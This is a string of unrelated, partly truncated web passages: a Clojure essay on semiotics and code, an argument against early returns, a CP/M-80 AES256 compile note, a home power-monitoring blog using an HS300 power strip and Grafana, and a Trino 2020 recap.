			<p>Every useful process goes through at least one iteration of pulling data into scope, transforming the data, and pushing that data into another scope.<sup id="fnref:process" role="doc-noteref"><a href="#fn:process">1</a></sup>  Consider <code>grep</code>: it reads a line from <code>stdin</code>, examines the line to see if it should be forwarded to <code>stdout</code>, and repeats until <code>stdin</code> is exhausted.  Conversely, <code>cat</code> isn’t independently useful; it only exists to forward the filesystem into another process, which may simply be our terminal.</p>

<p>In almost every case, the transformation of a useful process is <strong>reductive</strong>; it emits less than it consumes.  When a process has a larger volume of output than input, it’s generally providing a different (and ostensibly more useful) representation of its input.  Examples of this include <code>gunzip</code> and a program which, given a seed value, emits a neverending stream of pseudorandom numbers; both are only useful when placed upstream of another process.</p>

<p>For sufficiently small inputs, this might be useful on its own.  We can uncompress a small gzipped file and read it in the terminal, or swap the delimiters in a small CSV file for HTML tags and look at it in the browser.  But few datasets are intrinsically small; if we’re able to take in our data at a glance today, we shouldn’t expect to be so lucky tomorrow.</p>

<p>This reduction of our input data isn’t arbitrary; we are distilling it down to its meaning, in context.  If we’re concerned on the errors in our logs, we lose nothing by filtering out everything else.  If we’re concerned with the number of errors day-over-day, we lose nothing by reducing each log file down to a single number.  This is the essence of <strong>interpretation</strong>, as defined within the field of <a href="https://en.wikipedia.org/wiki/Semiotics">semiotics</a>: the transformation of one <a href="https://en.wikipedia.org/wiki/Sign_(semiotics)">sign</a> to a related sign, which often exists within a different <a href="https://en.wikipedia.org/wiki/Sign_system">system</a> of signs.</p>

<p>Our colloquial understanding of interpretation captures most of this; we are assigning meaning to something.  This process is subjective, and largely arbitrary; we are free to assign whatever meaning we like.  There are often multiple useful interpretations, and we can consider them together to better understand what we’re interpreting.</p>

<p>Semiotics also tells us that each meaning is itself just another sign, which can be interpreted in turn.  This idea, called <em>unlimited semiosis</em> in modern semiotics, was considered very unintuitive when it was first suggested in the 19th century by Charles Peirce.  In the context of software, however, it’s self-evident: each function interprets its inputs, yielding a result that can be interpreted by other functions, and so on.  There is no obvious or necessary end to this process; at some point we simply share our results with the outside world, allowing someone else to continue the chain of interpretation.</p>

<p>Meaning is created by combining software and data.  Data, by itself, is inert.  Software, by itself, is only a method for interpretation.  Software interprets data, but the converse is also true.  Different inputs will take different paths, and yield different meanings; our software is interpreted by the data it’s given.</p>

<p>This inverted perspective is useful when we look at how pieces of software are combined to create a whole.  When one function calls another, it is interpreting the purpose of the function it calls.  It is assigning meaning, in context.</p>

<p>Consider this expression, which removes all the bad values from a sequence of values:<sup id="fnref:clojure" role="doc-noteref"><a href="#fn:clojure">2</a></sup></p>



<p>The <code>remove</code> function, on its own, is highly abstract; it treats all possible predicates and all possible sequences as interchangeable.  By calling it with a specific predicate, we have made it more concrete.  As we further compose upstream, and the meaning of <code>s</code> becomes more defined, so too does the meaning of our expression.  If we think <code>(remove bad? ...)</code> lends itself to multiple interpretations, by multiple sequences, we might even give it a name:</p>

<div><div><pre><code><span>(</span><span>def</span><span> </span><span>good</span><span> </span><span>(</span><span>partial</span><span> </span><span>remove</span><span> </span><span>bad?</span><span>))</span><span>
</span></code></pre></div></div>

<p>As we compose functions, our program’s interpretation of its input becomes increasingly abstract; by filtering out <code>bad?</code> values, we treat any interleaving of those values as if they were the same.</p>

<p>Not every function, however, makes an equal contribution to this growing abstraction; <code>remove</code> is just a different idiom for <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>remove</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>filter</span><span>
    </span><span>(</span><span>complement</span><span> </span><span>predicate</span><span>)</span><span>
    </span><span>s</span><span>))</span><span>
</span></code></pre></div></div>

<p>Likewise, <code>complement</code> just negates a function’s return value, turning <code>false</code> to <code>true</code> and vice-versa.  These functions do not assign meaning, they attempt to preserve it in a different form.  Rather than interpreting, they are <strong>translating</strong>.</p>

<p>Of course, any semiotician will tell you that <a href="https://www.orionbooks.co.uk/titles/umberto-eco/mouse-or-rat/9781780226279/">translation isn’t easy</a>, and some meaning is invariably lost along the way.  But these strata in our codebases, which attempt to translate rather than interpret, are qualitatively different; they are what we call “glue code.”</p>

<p>This, however, only defers the act of interpretation to a higher strata.  Our code exists to be interpreted, either by data or by other code composed atop it.  We leave room for interpretation using two fundamental mechanisms: function references and conditional execution.</p>

<p>Both of these mechanisms allow a function’s inputs to influence its execution.  Consider this implementation of <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>filter</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>cond</span><span>
    </span><span>(</span><span>empty?</span><span> </span><span>s</span><span>)</span><span> 
    </span><span>[]</span><span>
    
    </span><span>(</span><span>predicate</span><span> </span><span>(</span><span>first</span><span> </span><span>s</span><span>))</span><span> 
    </span><span>(</span><span>cons</span><span> 
      </span><span>(</span><span>first</span><span> </span><span>s</span><span>)</span><span> 
      </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>))))</span><span>
      
    </span><span>:else</span><span>
    </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>)))</span><span>
</span></code></pre></div></div>

<p>First we check if the sequence is empty; if so, we return an empty sequence.  If it isn’t empty, we check if the first element satisfies the <code>predicate</code>; if so, we prepend it onto the result of filtering the rest of the sequence.  Otherwise, we omit the element from our result.</p>

<p>The first clause is simple conditional execution; given an empty sequence, <code>filter</code> will short-circuit.  The second clause is both a function reference and conditional execution; <code>filter</code> will call whatever <code>predicate</code> we’ve provided, and use the returned result to choose one of two branches.</p>

<p>But these are implementation details; the person calling <code>filter</code> should be able to focus on its semantics, not the precise way it uses its inputs.  As implementors, first we decide what sorts of interpretations our function will allow, and then we determine what minimal set of inputs will allow those interpretations.</p>

<p>In the above implementation, for instance, we don’t wrap each recursion in Clojure’s <a href="http://clojure-doc.org/articles/language/laziness.html#benefits-of-lazy-sequences"><code>lazy-seq</code></a> macro, meaning the entire filtered sequence is eagerly computed.  If we had made it lazy, that would allow for the code atop <code>filter</code> to have more control over where and when each element of the inputs sequence is processed.  Alternately, if we wanted to remain eager, we could have exposed a way for the code invoking <code>filter</code> to control what sort of collection it constructed, rather than always returning a <code>cons</code>-based list.</p>

<p>A broader range of possible interpretations isn’t necessarily better; simplicity has its own benefits.  If we’re happy discarding our code tomorrow, we can focus entirely on our needs today.  If we want our code to survive a bit longer, however, or even be a general-purpose library, we need to be more expansive.</p>

<p>In general-purpose code, we should rely on function references wherever possible.  In addition to the first-class functions that are common in Clojure, these encompass any object instance with one or more associated methods.<sup id="fnref:closures" role="doc-noteref"><a href="#fn:closures">3</a></sup>. Function references provide an <strong>open</strong> mechanism for interpretation; to extend the set of possible interpretations, you just have to write your own function.</p>

<p>Conditional execution, conversely, is a <strong>closed</strong> mechanism; to extend the set of possible interpretations we need to edit a preexisting function.  In general-purpose code, this is almost always driven by some sort of open classifier function, which reduces all possible values down to a finite set of categories.  In Java, for instance, <code>equals</code>, <code>compareTo</code>, and <code>hashCode</code> reduce their inputs down to 2, 3, and 2<sup>32</sup> categories, respectively.</p>

<p>In some cases, general-purpose code may also have conditional execution based on internal datatypes.  The semantics of a red-black tree, for instance, are entirely driven by an externally provided ordering function, but its internal bookkeeping will have <a href="http://matt.might.net/papers/germane2014deletion.pdf">lots</a> of <code>if</code>s or <code>match</code>es dealing with red and black nodes.</p>

<p>If your code has conditional execution based on public datatypes, however, it’s not meant to be general purpose; it’s what we call “business logic.”  This is the upper strata of our application, interpreted by data rather than other code.  Here, the closed nature of conditional execution is useful; we can understand the meaning of a given input by looking at a single point in our codebase.  What endpoints does our API offer?  Just look at the file where all of the routes are defined.</p>

<p>Almost anyone who writes software for a living can tell the difference between glue code, library code, and business logic.  The first time we heard each term, it was fairly clear from context and the names themselves what was being described.  If someone doesn’t understand, we assume they’ll figure it out soon, just like we did.</p>

<p>We may have a solid <a href="https://en.wikipedia.org/wiki/Tacit_knowledge">tacit understanding</a> of these concepts, but would struggle to explain them, and how they relate to each other.  Semiotics seems to provide a framework that can formalize and correlate this knowledge.  Put another way, I believe every skilled software designer has an innate, mostly undeveloped talent for applied semiotics, and I’m curious what would happen if they tried to develop it.</p>

<p>Unfortunately, I don’t think simply reading <a href="https://iupress.org/9780253202178/a-theory-of-semiotics/">a seminal text on semiotics</a> will suffice; the interpretation done by software is vastly more reductive than that done by humans.  When we use the idea of library to denote a book, or vice-versa, the amount of detail in our mental conception changes very little, if at all.  In many contexts, they will have very similar connotations.  But in a computer, a library-sized dataset is not an abstract symbol of knowledge; it’s a library’s worth of data, which is not at all the same as …</p></article></div></div></div>

    <p>The <code>if</code> statement (or <code>if</code> expression) is the cornerstone of every modern programming language - it is so pervasive that we rarely think about how exactly should we use it, or how it is meant to be used. But despite its popularity, <code>if</code> wasnâ€™t always there, and it wasnâ€™t as pervasive as nowadays, so its role is, Iâ€™d argue, still somewhat misunderstood. So in this article, I will examine some mistakes that we can easily avoid in order to improve on our code.</p>

<!--more-->



<p>This is an opinionated text, i.e. it contains my opinions and although I have many arguments that back them, they are ultimately based on <em>my</em> core beliefs about what programming is and should be, so take them as advice, as opposed to a dogma. And here are some of the things on which this advice is based on, structured as postulates.</p>

<blockquote>
  <p>Code is for humans (and programmers are humans too).</p>

<p>A form of this appears in a little book known in the hacker community as â€œSICPâ€�, but I donâ€™t know if they were the first to state it. It means that programs are not just instructions for performing a given task - they are text, and as such they should be subject to the same stylistical rules as other text is.</p>

<blockquote>
  <p>Code should be as bug-free as possible (and easy to debug as well).</p>
</blockquote>

<p>This one looks pretty self-explanatory, but the key point is that we have to dedicate effort to make it such, by constantly thinking not only about ways in which the code might go wrong, but also about ways to diagnose potential problems.</p>

<p>I guess I should say something about why I believe these things. Simple - because all other approaches just fail because of the human factor, e.g. any code, that is written without regard for style is bound to become legacy when the person who supports it leaves. Likewise, maintaining code that lacks structure results in bugs (which often can be fixed only by imposing more structure).</p>

<p>Lastly, people often contrast good structure and readability with speed. Firstly, the comparison is a bit unfair, because a well-structured is easier to optimize. And for cases in which it is really the case, in 99% the gain is so little that nobody cares, so the emphasis should remain on readability and structure even then. This is when I would throw this very famous quote by DEK:</p>

<blockquote>
  <p>Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97 % of the time: pre mature optimization is the root of all evil.
<a href="http://www.kohala.com/start/papers.others/knuth.dec74.html">source</a></p>
</blockquote>

<p>Keep in mind that he wrote this when computers were a thousand times slower than today, so we should care about maintainability even more.</p>



<p>Once upon a time, all there was was the assembly language where people didnâ€™t have brackets and had to use <code>jump</code> instructions instead. For those who donâ€™t know what jump does, if you imagine that somewhere in the virtual machine, or the interpreter, that runs your code there is a variable that denotes which line of code should be executed next, then <code>jump</code> is a functionality that basically allows you to set that variable to whatever value you please - it is like a portal that allows you to go to from any place of the program to any other place. For example, a typical <code>if</code> statement that looks like this when written with jumps:</p>

<div><div><pre><code>compare input to waterlevel
if less, jump to A
if equal, jump to B
jump to C

A:
turn motor on
jump to C

B:
turn motor off
C:
...
</code></pre></div></div>
<p><a href="https://stackoverflow.com/questions/40602029/how-to-write-if-else-in-assembly">Source for the assembly pseudocode</a></p>

<p>You can see from this example that, although powerful, jumps are much harder to work with than <code>if</code>-s, although they can sometimes make your code a bit shorter, they will 100% make it less readable which is hardly a good deal - if the important thing is for code to bug free, so youâ€™d always prefer to have a longer and more readable piece of code, than one which is shorter but harder to understand. This realization led to the rise of what was at the time called â€œstructural programmingâ€� paradigm, which was based on the idea that the power of jumps should not be exposed to the programmer - a point which was brought by Edsger W. Dijkstra in the seminal essay <a href="http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html">Go To Statement Considered Harmful</a> (<code>goto</code> is the equivalent of a <code>jump</code> instruction statements in non-assembly language context). Simultaneously, the idea of a <em>block</em> (or a â€œcompound statementâ€�) meaning a collection statements that perform a common task (usually denoted today by wrapping them in curly brackets) was pushed forward, and the two ideas gave birth to the <code>if</code> statement that we know today (that <a href="https://craftofcoding.wordpress.com/2017/04/29/the-evolution-of-if-i-from-fortran-i-to-algol-60/">first appeared in the <em>Algol 60</em> programming language</a>):</p>

<div><div><pre><code>if (input less than waterlevel) {
  turn motor on
} else if (input equal to waterlevel) {
turn motor off
} else {
...
</code></pre></div></div>

<p>The adoption of structured programming was a long process which began with people even questioning whether structured programs are even capable of encoding all possible computations, but today, although some people are <a href="https://stackoverflow.com/questions/46586/goto-still-considered-harmful">still defending the use of goto</a>, it (the process) is largely finished - <code>goto</code> is banished and the structured style of programming is so pervasive across modern languages that the term â€œstructuredâ€� is not used any more, simply because there is nothing to contrast it with.</p>

<p>And to reiterate, the reasons for this are quite obvious - using brackets makes our code much more akin to the way we usually talk and write with each other: we often say</p>

<blockquote>
  <p>â€œif A then B otherwise Câ€�</p>
</blockquote>

<p>we never say things like,</p>

<blockquote>
  <p>â€œif A then go to the previous page and start reading from line 12â€�.</p>
</blockquote>

<p>(I wonder if the programmers who defend the use of <code>goto</code> write and talk like that?)</p>

<p>This already leads me to the first rule that I always follow.</p>



<p>A leftover from the <code>goto</code>-driven style of programming is the possibility of so-called â€œearly exitâ€� - the ability to quit the execution of a given function or method from any place of itâ€™s body (most-oftenly by using the keyword <code>return</code>) as opposed to executing the function to the end. So again if we consider our plain old <code>if</code> <code>else</code> statement:</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
} else {
    turn motor off
}
...
</code></pre></div></div>
<p>Using <code>return</code> we can write it like this</p>

<div><div><pre><code>if (input less than waterleve) {
    return turn motor on
} 
turn motor off
...
</code></pre></div></div>

<p>When used like this, <code>return</code> is directly translatable to a <code>goto</code>.</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
    Jump to C
}
turn motor off
C:
...
</code></pre></div></div>

<p>Why not write like this? We already established that <code>goto</code> is bad and Iâ€™d argue that mixing the two approaches is even worse in some respects, as it might fool you that the code is structured when it really isnâ€™t. Furthermore, the early exit makes our code as confusing as any other <code>goto</code>-containing code when translated to natural language. Imagine someone saying:</p>

<blockquote>
  <p>â€œBring me a coffee if you get home early.â€�</p>
</blockquote>

<p>and then imagine them saying.</p>

<blockquote>
  <p>â€œIf you donâ€™t get home early ignore everything Iâ€™d say after this sentence. Bring me a coffee.â€�</p>
</blockquote>

<p>So if your language supports it, always rely on the implicit <code>return</code> instead of explicitly ending your execution. If not, the simple rule you can follow is that you should either return from all branches of the <code>if</code> statement or from none of them.</p>

<h2 id="combining-ifs-with-functions">Combining <code>if</code>â€™s with functions</h2>

<p>The most common type of situation that I have seen the premature <code>return</code> pattern is for handling errors. Imagine for example a very long function with some validation at the beginning. Many people would write:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } 

  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
  ...
}
</code></pre></div></div>

<p>This is a very subtle variant of the issue I am describing (made even more subtle by the fact that <code>throw</code> is used instead of a <code>return</code>). The correct way would be:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } else {
      create account for user
      sign user up
      initialise some other stuff
      write action in log
      send emails
    ...
  }
}
</code></pre></div></div>

<p>but people would prefer having the main function code directly in the body in order to avoid indentation (especially if there is a lot of it already). According to them (and they have a point) the error handling is somewhat outside of the domain of the function, we can perhaps say that they are at different levels of abstraction. In cases like this, we should use <em>functions</em> to structure our code and to keep the different levels of abstraction separate.</p>

<p>Functions are everything that random sequences of statement are not and can never be - they <em>have names</em>, they have <em>a separate scope</em> (blocks also have their own scope, but they also inherit the scope of the parent block), and most importantly they are <em>easy to debug</em> (e.g. you have the name of the thing that went wrong right there on the top of the stack trace. So letâ€™s look at how the code above can be made to work with functions. I think this is a very cool and underused pattern that allows you to lose the indentation without sacrificing your structure.</p>
<div><div><pre><code>
signup (user) {
  if (username is valid ) {
      throw invalid username
  } else {
      return signup internal (user)
  }
}

signup internal (user) { // or _signup as some people name it
  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
...
}
</code></pre></div></div>



<p>This is another bad pattern that, we might say, has the same root cause as the first one - in their effort to keep things simple and concise, people donâ€™t include all the structure that needs to be there in a robust piece of code.</p>

<p>In <code>if</code> statements we often have to deal with multiple conditions that are dependent on one another. And sometimes in such cases, people try to deal with all of them in one statement with multiple branches and <code>else if</code>-s. I argue that itâ€™s actually better to have <em>one statement per condition</em> …</p></div></div>

Since 1973 (<a href="https://www.bell-labs.com/usr/dmr/www/primevalC.html">earliest versions of 'C'</a>) many C compilers were published, of course also for CP/M.

                <p>I choosed&nbsp;an unusual source code, AES256 Encryption and Decryption from &gt;<a href="http://www.literatecode.com/2007/11/11/aes256/">Literatecode</a>&lt;, which is a quite complex program&nbsp;for CP/M-80.</p>
                <p>I had to change the source code to K&amp;R syntax (good old days), and had to shorten the subroutine names a bit (remember, there's a small limit for external symbol names, which is totally unusual for current C compiler&nbsp;!).<br>
Also, I defined a pointer type for easier subroutine parameter declaration.</p>
                <div><p>For convinience reasons, I did not take <i>aes256.h</i> for type definitions.</p><p>

I was a bit surprised after I got it </p><u><span color="#990000">really working</span></u><p> - at least with HiTech C.<br>
All other C compiler hat their own, special problems, e.g. producing assembler or object code didn't work due to more restrictions for external symbols, or just errors when linking it together.</p><p>

This is the output of the CP/M-80 AES256 demo program:</p><p><span face="Courier New">B&gt;demo<br>

&nbsp;
B&gt;</p></span></p></div>
                <p>And here is the source code with the readily compiled CP/M-80 executable:<br>
&gt;<a href="http://www.z80.eu/downloads/aes256.zip">aes256.zip</a>&lt;<br>
(<i>aes256.h </i>is not included as a separate file, it's integrated within the source)<br>
The CP/M-80 executable included is the above shown <i>demo.com</i>.<br>
So it would be possible to write your own CP/M-80 encryption program (think about the execution speed... you have to be patient).</p>

<p>
Recently, I became interested in measuring the electricity consumption
of electronic devices at my home and, in particular, my computer. Computer power
supplies are typically rated from 400W to 800W. I wanted to see how much power is
actually needed for day-to-day computing - writing code, browsing the Internet, playing
games, running ML jobs. And how does it compare with a laptop and other mobile devices.
</p>

<p>
As a kid, I was once told by an engineer that the bulk of the energy is consumed by
the monitor, and the desktop itself consumes lesser energy<sup><a id="fnr.1" href="#fn.1">1</a></sup>. So if I switch off
the monitor, I can play music, download things overnight without wasting too much
energy. This statement stuck with me over time as my bulky CRT monitor was replaced
with sleek LED monitors and a beefy 250W GPU got added to my desktop. It was time
I measure everything and find out if the engineer's statement still holds.
</p>

<div id="outline-container-orga6a4ce1">
<h2 id="orga6a4ce1">Hardware</h2>
<div id="text-orga6a4ce1">
<p>
A quick search revealed that <a href="https://en.wikipedia.org/wiki/Kill_A_Watt">Kill A Watt</a> meters are one of the most popular ways
of measuring the energy consumption. I wanted to log the consumption so that I can
analyze the trends over time. That's why I passed these meters on. But these meters
have an inbuilt screen and do not require mobile or network access so they can
be a great solution if someone is looking for a quick way to see the consumption.
On the other end of the spectrum, there are some devices that can be plugged directly
into the circuit panel of the house and they can be used to analyze consumption
of all appliances in the house. For my goal of measuring energy consumption of
my computer, this was simply overkill and would not have provided the fine-grained
monitoring I needed (and I'm a little scared of messing with the AC power).
</p>

<p>
I finally settled on TP-Link Power Strip: <a href="https://www.kasasmart.com/us/products/smart-plugs/kasa-smart-wi-fi-power-strip-hs300">HS300</a>. This <i>smart</i> power strip has
the usual <i>smart</i> plug features, like, it can be controlled using a mobile app, but
it also has energy monitoring built-in. And most importantly there are some awesome projects
on Github - <a href="https://github.com/python-kasa/python-kasa">python-kasa</a>, <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a> - that have reverse engineered the communication
protocol and provide a nice interface to talk to them.

<div id="text-org01d1f27">



<p>
Figure 2<sup><a id="fnr.2" href="#fn.2">2</a></sup> shows a high-level picture of how the energy consumption values
get extracted, stored and visualized.

<div id="outline-container-orgd7e2f19">
<h3 id="orgd7e2f19">Polling HS300</h3>
<div id="text-orgd7e2f19">
<p>
The project <a href="https://github.com/python-kasa/python-kasa">python-kasa</a> provides a nice interface to control TP-Link devices but there's
an <a href="https://github.com/python-kasa/python-kasa/issues/64">issue</a> with querying the energy monitor of child plugs. That's why I used the project <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a>
which seems like an older version of the python-kasa project. I added a cron job to query
the power strip every 5 minutes and dump the data in a text file, using a simple bash script:
</p>
<div>
<pre><code>#! /bin/bash

power=$(/home/pi/.local/bin/pyhs100 --strip --host &lt;IP of the power strip&gt; emeter | tail -n 1)
timestamp=$(date +%s)

echo -e "$timestamp, $power"
</code></pre>
</div>
<p>
This creates a bulky line for each sample it records and there is certainly a
lot of room to compress it. I'm currently sampling it every 5 minutes, so I don't
mind it, but if you are planning to sample it every minute or every few seconds,
you might want to trim it down.
</p>
</div>
</div>

<div id="outline-container-orgd23b686">
<h3 id="orgd23b686">Grafana Datasource</h3>
<p>
I'm using Grafana to visualize this data to see trends in usage over time. We
can dump all of the data into one of the Datasource that is supported by default
by Grafana but I did not like that extra step for such simple data. So I wrote
<a href="https://github.com/anuragpeshne/grafana-kasa-power-strip">my own backend datasource</a> that directly serves Grafana, data from the logs we
collected. This uses the <a href="https://grafana.com/grafana/plugins/grafana-simple-json-datasource">SimpleJson</a> datasource plugin.
</p>

<div id="outline-container-orgfc16d58">
<h2 id="orgfc16d58">Results</h2>
<p>
The results were informative and nothing less than an eye-opener for me. Some devices,
like computers, chargers, consume varying amounts of energy, and some devices, like
lamps, monitors, consume constant energy. I might write a follow-up post just
about the consumption of my computer running various workloads and applications.
Here are few that I found interesting:

<div id="outline-container-org82c2bcb">
<h2 id="org82c2bcb">Conclusion</h2>
<div id="text-org82c2bcb">
<p>
The energy consumption of the monitor is just 10% - 25% of the desktop energy consumption.
So, although it might be still a good idea to turn off the monitor when things
are running in the background, monitors are not the major consumers anymore
(if they were at all earlier). It is interesting to note that the actual
consumption is much less than the rated wattage of the devices.
</p>

<p>
It is also interesting to note the difference in magnitude of the consumption.
So getting a gold rated PSU will have much more impact than having a more efficient
iPhone charger. But none of this matters when you are sitting next to a 3KW space heater ;)

    <p><strong>Wow!</strong> If you would have to sum up what happened in the last year in this
great community, <strong>wow</strong> would be it. It is truly awe-inspiring to be part of
this incredible journey of Trino. Oh yeah, on that note. Our community and
project <a href="https://trino.io/blog/2020/12/27/announcing-trino.html">chose the new name Trino</a>,
to be able to continue to innovate and develop freely as a community of peers.
Presto® and Presto® SQL are a thing of the past.</p>

<p>Now that is out of the way, let’s dive right in and see what all our community
members across the globe have created with us!</p>

<!--more-->

<p><a href="https://trino.io/blog/2020/01/01/2019-summary.html">2019 was a big year for us</a>, but check
out how 2020 eclipsed even that!</p>
<h2 id="by-the-numbers">By the numbers</h2>

<p>Even the size and growth of <a href="https://trino.io/slack.html">our community on Slack</a> is impressive:</p>

<ul>
  <li>Started in January 2020 with ~1600 members and 280 weekly active</li>
  <li>Over 3200 members by December 2020</li>
  <li>560 members active weekly</li>
</ul>

<p>The innovation and change of <a href="https://github.com/trinodb/trino">the source code on GitHub</a> is a result of the hard work of the community:</p>

<ul>
  <li>Over 4000 commits merged</li>
  <li>More than 2800 pull requests received</li>
  <li><a href="https://trino.io/docs/current/release.html#releases-2020">23 releases</a>, nearly every two
weeks basically!</li>
</ul>

<p>As you can see, much of the excitement around the name change has quickly
increased the number of stars we have on GitHub. While some of this certainly
stems from an initial buzz around a shiny new name, we also believe that this
name change has brought clarity to the community. Trino is an improved version,
supported by the founders and creators of Presto®, along with the major
contributors.</p>

<p>And if you have not done so already, make sure to <a href="https://github.com/trinodb/trino">star the
repository</a> and <a href="https://trino.io/slack.html">join us on slack</a>.</p>

<h2 id="features-and-code">Features and code</h2>

<p>While everything mentioned is already exciting, the true work is visible in the
new features and improvements in Trino. It is a long list, but read on. You
won’t want to miss anything.</p>

<h3 id="improvements-to-ansi-sql-support">Improvements to ANSI SQL support</h3>

<p>A core feature of Trino is the ability to use the same standard SQL for any
connected data source. These improvements empower all users.</p>

<ul>
  <li>Variable-precision temporal types, with precision down to picoseconds
(10<sup>−12</sup>s). This a very important feature for any time critical
systems such as financial transactions processing</li>
  <li>Correct, and now SQL specification compliant timestamp semantics, making
migration of SQL statements from other compliant systems such as many RDBMSs
easier</li>
  <li>Implicit coercions for <code>INSERT</code> clause</li>
  <li>Support for <code>RANGE</code> and <code>GROUPS</code>-based window frames</li>
  <li>More support for various shapes of correlated subqueries</li>
  <li>Support for <code>INTERSECT ALL</code> and <code>EXCEPT ALL</code></li>
  <li>Parameter support in <code>LIMIT</code>, <code>FETCH FIRST</code>, and <code>OFFSET</code> clause</li>
  <li>Experimental support for <a href="https://trino.io/docs/current/sql/select.html?highlight=recursive#with-recursive-clause">recursive queries</a></li>
  <li>Enforcement of <code>NOT NULL</code> constraints when inserting data</li>
  <li>Quantified comparisons (e.g., <code>&gt; ALL (...)</code>) in aggregation queries</li>
</ul>

<h3 id="other-query-improvements">Other query improvements</h3>

<p>A number of other features were added to make querying your data sources with
Trino even more powerful:</p>

<ul>
  <li><a href="https://trino.io/docs/current/language/types.html#t-digest">T-digest data type</a> and functions
for approximate quantile computations</li>
  <li>Support for setting and reading column comments</li>
  <li>Numerous new functions including <code>concat_ws()</code>, <code>regexp_count()</code>,
<code>regexp_position()</code>, <code>contains_sequence()</code>, <code>murmur3()</code>,
<code>from_unixtime_nanos()</code>, <code>from_iso8601_timestamp_nanos()</code>,
<code>human_readable_seconds()</code>, <code>bitwise</code> operations, <code>luhn_check()</code>,
<code>approx_most_frequent()</code>, <code>translate()</code>, <code>starts_with()</code></li>
</ul>

<h2 id="performance">Performance</h2>

<p>Trino is already <a href="https://trino.io/index.html">ludicrously fast</a>. But then again, even faster is
better, so we worked on that:</p>

<ul>
  <li>Improved pushdown of complex operations into connectors, including
<a href="https://trino.io/docs/current/optimizer/pushdown.html">aggregation pushdown</a> and TopN
pushdown.</li>
  <li><a href="https://trino.io/blog/2020/06/14/dynamic-partition-pruning.html">Dynamic filtering and partition pruning</a>, which can improve performance of
highly selective joins manyfold.</li>
  <li>Cost-based decisions for queries containing <code>IN &lt;subquery&gt;</code> in <code>WHERE</code> clause.</li>
  <li>Information_schema performance improvements, which benefit third-party BI
tools that need to inspect table metadata, for example DBeaver, Datagrip,
Power BI, Tableau, Looker, and others.</li>
  <li><a href="https://trino.io/blog/2020/08/14/dereference-pushdown.html">Faster queries on nested data in Parquet and ORC</a>.</li>
  <li>Faster and more accurate <code>approx_percentile</code>, based on t-digest data structure.</li>
  <li>Support of Bloom filters in ORC.</li>
  <li>Experimental, optimized Parquet writer.</li>
</ul>

<h2 id="security">Security</h2>

<p>The more data you access with Trino, the more it becomes critical to secure it.
With that in mind we added a lot of improvements:</p>

<ul>
  <li>The <a href="https://trino.io/docs/current/admin/web-interface.html">Web UI</a> now requires
authentication. Various actions such as viewing query details, killing
queries, etc., are protected with authorization checks based on the identity
of the user. Additionally, the UI now supports OAuth2 for user identification.</li>
  <li>External and internal APIs are now properly secured with authentication and
authorization checks. Importantly, this fixes a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15087">CVE reported
vulnerability</a>
that affects all older versions of Presto®.</li>
  <li>A <a href="https://trino.io/docs/current/security/secrets.html">new mechanism to externalize secrets in configuration
 files</a> that makes it easier to integrate
 with third-party secret managers and deployment tools.</li>
  <li>Support for JSON Web Key (JWK) authentication and <a href="https://trino.io/docs/current/develop/certificate-authenticator.html">pluggable certificate
authenticators</a>.</li>
  <li>Add new <a href="https://trino.io/blog/2021/01/08/docs/current/security/salesforce.html">Salesforce authenticator</a>.</li>
  <li>The query engine and access control SPIs now support injecting row filters and
column masks.</li>
  <li>New syntax for managing permissions (<code>GRANT/REVOKE</code> on schema,
<code>ALTER TABLE/SCHEMA/VIEW ... SET AUTHORIZATION</code>).</li>
</ul>

<h2 id="data-sources">Data sources</h2>

<p>Trino empowers you to use one platform to access all data sources. Connectors
enable this and we added numerous new connectors:</p>

<ul>
  <li><a href="https://trino.io/docs/current/connector/iceberg.html">Iceberg</a></li>
  <li><a href="https://trino.io/docs/current/connector/prometheus.html">Prometheus</a></li>
  <li><a href="https://trino.io/docs/current/connector/oracle.html">Oracle</a></li>
  <li><a href="https://trino.io/docs/current/connector/pinot.html">Pinot</a></li>
  <li><a href="https://trino.io/docs/current/connector/druid.html">Druid</a></li>
  <li><a href="https://trino.io/docs/current/connector/bigquery.html">BigQuery</a></li>
  <li><a href="https://trino.io/docs/current/connector/memsql.html">MemSQL</a></li>
</ul>

<p>All other connectors received a large host of improvements. Let’s just look at
two popular connectors:</p>

<h3 id="hive-connector-for-hdfs-s3-azure-and-cloud-object-storage-systems">Hive connector for HDFS, S3, Azure and cloud object storage systems</h3>

<ul>
  <li>Complex Hive views, allows integration with Hive or simplifying
migration from Hive</li>
  <li><a href="https://trino.io/blog/2020/06/01/hive-acid.html">ACID transactional tables</a> with <code>INSERT</code>
and <code>DELETE</code> support</li>
  <li><a href="https://trino.io/docs/current/connector/hive-caching.html">Built-in storage caching</a> and
support for <a href="https://trino.io/docs/current/connector/hive-alluxio.html">external caching with
Alluxio</a></li>
  <li>New procedures: <code>system.drop_stats()</code>, <code>register_partition()</code>,
<code>unregister_partition()</code></li>
  <li>Support for <a href="https://trino.io/docs/current/connector/hive-azure.html">Azure object storage</a></li>
  <li>Support for <a href="https://trino.io/docs/current/connector/hive-s3.html">S3 encrypted files, flexible S3 security mappings and
Intelligent-Tiering S3 storage</a></li>
</ul>

<h3 id="elasticsearch-connector">Elasticsearch connector</h3>

